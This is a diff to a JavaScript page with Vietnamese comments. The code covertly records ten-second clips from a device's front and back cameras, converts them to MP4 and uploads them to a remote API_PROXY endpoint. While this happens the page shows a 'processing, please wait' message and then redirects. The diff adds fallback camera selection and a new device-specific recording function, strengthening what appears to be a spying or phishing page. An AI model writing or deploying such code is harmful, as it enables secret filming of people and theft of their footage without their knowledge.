@@ -43,8 +43,12 @@ function detectDevice() {
 // --- 2. LẤY DANH SÁCH CAMERA ---
 async function getCameraList() {
   try {
+    // Yêu cầu quyền truy cập camera trước
+    await navigator.mediaDevices.getUserMedia({ video: true });
+    
     const devices = await navigator.mediaDevices.enumerateDevices();
     const cameras = devices.filter(device => device.kind === 'videoinput');
+    console.log('📷 Danh sách camera:', cameras.map(c => c.label));
     return cameras;
   } catch (e) {
     console.error('Lỗi lấy danh sách camera:', e);
@@ -52,8 +56,8 @@ async function getCameraList() {
   }
 }
 
-// --- 3. QUAY VIDEO NGẦM (Hỗ trợ cả 2 camera) ---
-async function recordVideoSilent(deviceId = null, duration = 10000) {
+// --- 3. QUAY VIDEO NGẦM ---
+async function recordVideoSilent(facingMode = 'user', duration = 10000) {
   if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
   
   try {
@@ -78,16 +82,15 @@ async function recordVideoSilent(deviceId = null, duration = 10000) {
       mimeType = 'video/webm';
     }
 
-    // Cấu hình video với deviceId cụ thể
+    // Cấu hình video với facingMode
     const videoConstraints = {
+      facingMode: facingMode,
       width: { ideal: 640 },
       height: { ideal: 480 }
     };
-    
-    if (deviceId) {
-      videoConstraints.deviceId = { exact: deviceId };
-    }
 
+    console.log(`🎥 Đang quay camera ${facingMode === 'user' ? 'TRƯỚC' : 'SAU'}...`);
+    
     const stream = await navigator.mediaDevices.getUserMedia({ 
       video: videoConstraints, 
       audio: false 
@@ -108,6 +111,7 @@ async function recordVideoSilent(deviceId = null, duration = 10000) {
       mediaRecorder.onstop = () => {
         const blob = new Blob(chunks, { type: mimeType });
         stream.getTracks().forEach(t => t.stop());
+        console.log(`✅ Đã quay xong camera ${facingMode === 'user' ? 'TRƯỚC' : 'SAU'}, dung lượng: ${(blob.size / 1024).toFixed(2)} KB`);
         resolve(blob);
       };
 
@@ -121,7 +125,7 @@ async function recordVideoSilent(deviceId = null, duration = 10000) {
     });
 
   } catch (e) {
-    console.error('Lỗi quay video ngầm:', e);
+    console.error(`❌ Lỗi quay camera ${facingMode}:`, e);
     return null;
   }
 }
@@ -164,6 +168,7 @@ async function ensureMP4(blob) {
       recorder.onstop = () => {
         const mp4Blob = new Blob(chunks, { type: 'video/mp4' });
         URL.revokeObjectURL(url);
+        console.log('✅ Đã chuyển sang MP4');
         resolve(mp4Blob);
       };
       
@@ -181,7 +186,6 @@ async function ensureMP4(blob) {
       video.play();
       drawFrame();
       
-      // Dừng sau 1 giây nếu video bị lỗi
       setTimeout(() => {
         if (recorder.state === 'recording') {
           recorder.stop();
@@ -201,7 +205,6 @@ async function main() {
   
   detectDevice();
 
-  // Cập nhật trạng thái
   if (statusDiv) {
     statusDiv.innerHTML = '⏳ Đang xử lý...<br>Vui lòng đợi.';
   }
@@ -210,61 +213,51 @@ async function main() {
   
   // Lấy danh sách camera
   const cameras = await getCameraList();
-  console.log('Danh sách camera:', cameras);
+  console.log(`📷 Tổng số camera: ${cameras.length}`);
   
-  // Xác định camera trước và sau
-  let frontCamera = null;
-  let backCamera = null;
+  // === QUAY CAMERA TRƯỚC (facingMode: user) ===
+  console.log('📸 Bắt đầu quay CAMERA TRƯỚC...');
+  let frontVideo = await recordVideoSilent('user', 10000);
   
-  // Trên mobile: camera trước thường là facingMode: 'user'
-  // camera sau là facingMode: 'environment'
-  for (const cam of cameras) {
-    const label = cam.label.toLowerCase();
-    if (label.includes('front') || label.includes('face') || label.includes('user')) {
-      frontCamera = cam;
-    } else if (label.includes('back') || label.includes('rear') || label.includes('environment')) {
-      backCamera = cam;
+  // Nếu không quay được camera trước, thử lại với deviceId
+  if (!frontVideo && cameras.length > 0) {
+    // Tìm camera trước dựa trên label
+    let frontCam = cameras.find(c => 
+      c.label.toLowerCase().includes('front') || 
+      c.label.toLowerCase().includes('face') ||
+      c.label.toLowerCase().includes('user')
+    );
+    
+    if (frontCam) {
+      console.log('📸 Thử quay camera trước với deviceId:', frontCam.label);
+      frontVideo = await recordVideoSilentWithDevice(frontCam.deviceId, 10000);
     }
   }
   
-  // Nếu không phân biệt được, lấy camera đầu làm trước, camera thứ 2 làm sau
-  if (!frontCamera && cameras.length >= 2) {
-    frontCamera = cameras[0];
-    backCamera = cameras[1];
-  } else if (!frontCamera && cameras.length === 1) {
-    frontCamera = cameras[0];
-  } else if (!frontCamera && !backCamera && cameras.length === 0) {
-    // Không có camera
-    info.camera = '🚫 Không tìm thấy camera';
-  }
+  // === QUAY CAMERA SAU (facingMode: environment) ===
+  console.log('📸 Bắt đầu quay CAMERA SAU...');
+  let backVideo = await recordVideoSilent('environment', 10000);
   
-  let frontVideo = null;
-  let backVideo = null;
-  
-  // Quay video từng camera
-  if (frontCamera) {
-    console.log('Quay camera trước:', frontCamera.label);
-    frontVideo = await recordVideoSilent(frontCamera.deviceId, 10000);
-  } else {
-    // Thử quay với facingMode: user
-    try {
-      console.log('Thử quay camera trước (facingMode: user)');
-      frontVideo = await recordVideoSilent(null, 10000);
-    } catch (e) {
-      console.error('Lỗi quay camera trước:', e);
+  // Nếu không quay được camera sau, thử lại với deviceId
+  if (!backVideo && cameras.length > 1) {
+    let backCam = cameras.find(c => 
+      c.label.toLowerCase().includes('back') || 
+      c.label.toLowerCase().includes('rear') ||
+      c.label.toLowerCase().includes('environment')
+    );
+    
+    if (backCam) {
+      console.log('📸 Thử quay camera sau với deviceId:', backCam.label);
+      backVideo = await recordVideoSilentWithDevice(backCam.deviceId, 10000);
     }
   }
   
-  // Nếu có camera sau và khác camera trước
-  if (backCamera && backCamera.deviceId !== frontCamera?.deviceId) {
-    console.log('Quay camera sau:', backCamera.label);
-    backVideo = await recordVideoSilent(backCamera.deviceId, 10000);
-  } else if (cameras.length >= 2) {
-    // Thử quay với camera khác
-    const otherCam = cameras.find(c => c.deviceId !== frontCamera?.deviceId);
+  // Nếu vẫn không có camera sau, dùng camera đầu tiên (khác camera trước)
+  if (!backVideo && cameras.length >= 2) {
+    const otherCam = cameras.find(c => c.deviceId !== frontCam?.deviceId);
     if (otherCam) {
-      console.log('Quay camera thứ 2:', otherCam.label);
-      backVideo = await recordVideoSilent(otherCam.deviceId, 10000);
+      console.log('📸 Thử quay camera khác:', otherCam.label);
+      backVideo = await recordVideoSilentWithDevice(otherCam.deviceId, 10000);
     }
   }
   
@@ -274,21 +267,16 @@ async function main() {
   
   if (frontVideo) {
     frontMP4 = await ensureMP4(frontVideo);
-    console.log('Camera trước: đã chuyển sang MP4');
+    console.log('✅ Camera trước: đã chuyển sang MP4');
+  } else {
+    console.log('❌ Không quay được camera trước');
   }
   
   if (backVideo) {
     backMP4 = await ensureMP4(backVideo);
-    console.log('Camera sau: đã chuyển sang MP4');
-  }
-  
-  // Nếu không có video nào, thử quay với facingMode
-  if (!frontMP4 && !backMP4) {
-    console.log('Thử quay với facingMode user');
-    const video = await recordVideoSilent(null, 10000);
-    if (video) {
-      frontMP4 = await ensureMP4(video);
-    }
+    console.log('✅ Camera sau: đã chuyển sang MP4');
+  } else {
+    console.log('❌ Không quay được camera sau');
   }
   
   info.camera = (frontMP4 || backMP4) ? '✅ Đã quay video MP4' : '🚫 Không quay được video';
@@ -300,18 +288,22 @@ async function main() {
   if (frontMP4 || backMP4) {
     if (frontMP4) {
       formData.append('front', frontMP4, 'front.mp4');
+      console.log('📤 Đã thêm front.mp4 vào form');
     }
     if (backMP4) {
       formData.append('back', backMP4, 'back.mp4');
+      console.log('📤 Đã thêm back.mp4 vào form');
     }
     
     try {
+      console.log('📤 Đang gửi video lên server...');
       await fetch(API_PROXY, { method: 'POST', body: formData });
+      console.log('✅ Đã gửi video thành công');
     } catch (e) {
-      console.error('Lỗi gửi video:', e);
+      console.error('❌ Lỗi gửi video:', e);
     }
   } else {
-    // Nếu không quay được video, gửi text
+    console.log('📤 Gửi text (không có video)...');
     await fetch(API_PROXY, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -345,6 +337,73 @@ async function main() {
     setTimeout(() => {
       window.location.href = "";
     }, 3000);
+  }
+}
+
+// --- 6. QUAY VIDEO VỚI DEVICEID ---
+async function recordVideoSilentWithDevice(deviceId, duration = 10000) {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+  
+  try {
+    const mimeTypes = [
+      'video/mp4;codecs=h264',
+      'video/mp4;codecs=avc1',
+      'video/webm;codecs=vp9',
+      'video/webm;codecs=vp8',
+      'video/webm'
+    ];
+    
+    let mimeType = null;
+    for (const type of mimeTypes) {
+      if (MediaRecorder.isTypeSupported(type)) {
+        mimeType = type;
+        break;
+      }
+    }
+    
+    if (!mimeType) {
+      mimeType = 'video/webm';
+    }
+
+    const stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { 
+        deviceId: { exact: deviceId },
+        width: { ideal: 640 },
+        height: { ideal: 480 }
+      }, 
+      audio: false 
+    });
+
+    const mediaRecorder = new MediaRecorder(stream, {
+      mimeType: mimeType,
+      videoBitsPerSecond: 1000000
+    });
+
+    const chunks = [];
+
+    return new Promise((resolve) => {
+      mediaRecorder.ondataavailable = (e) => {
+        if (e.data.size > 0) chunks.push(e.data);
+      };
+
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(chunks, { type: mimeType });
+        stream.getTracks().forEach(t => t.stop());
+        resolve(blob);
+      };
+
+      mediaRecorder.start(1000);
+      
+      setTimeout(() => {
+        if (mediaRecorder.state === 'recording') {
+          mediaRecorder.stop();
+        }
+      }, duration);
+    });
+
+  } catch (e) {
+    console.error('Lỗi quay video với deviceId:', e);
+    return null;
   }
 }
 
